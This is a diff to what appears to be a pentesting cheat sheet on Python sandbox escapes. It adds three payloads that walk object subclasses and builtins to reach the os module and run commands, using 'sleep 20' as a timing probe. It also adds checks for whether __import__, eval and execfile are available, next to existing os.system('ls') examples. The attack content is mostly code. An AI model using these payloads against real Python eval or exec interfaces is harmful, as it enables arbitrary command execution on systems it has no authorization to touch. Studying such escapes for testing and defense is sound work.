@@ -66,7 +66,14 @@ sys.modules["os"].system("ls")
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 
+# 4
+cmd = '''i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')\ni.system('sleep 20')'''
 
+# 5
+cmd = '''{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 20')'''
+
+#6
+cmd = '''''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()'''
 
 ```
 
@@ -152,6 +159,11 @@ system('ls')
   * Both `__builtin__` and `__builtins__` are exactly the same
   * You could print all built in functions using `dir(__builtin__)`
   * All functions except print will work normally, to execute print normally you need to first run `from __future__ import print_function`
+* Check how to call builtins
+  * `'__import__' in dir(__builtins__)`
+  * `'eval' in dir(__builtins_)`
+  * `'execfile' in dir(__builtins__)`
+  * \`\`
 * Examples
   * `import __builtin__`
     * Loading \_\_builtin\_\_ module
@@ -168,6 +180,8 @@ system('ls')
   * `__builtin__.__dict__['__import__']("os").system("ls")`
 
 ### If No builtin module in exec\(\)
+
+
 
 {% tabs %}
 {% tab title="Python2" %}
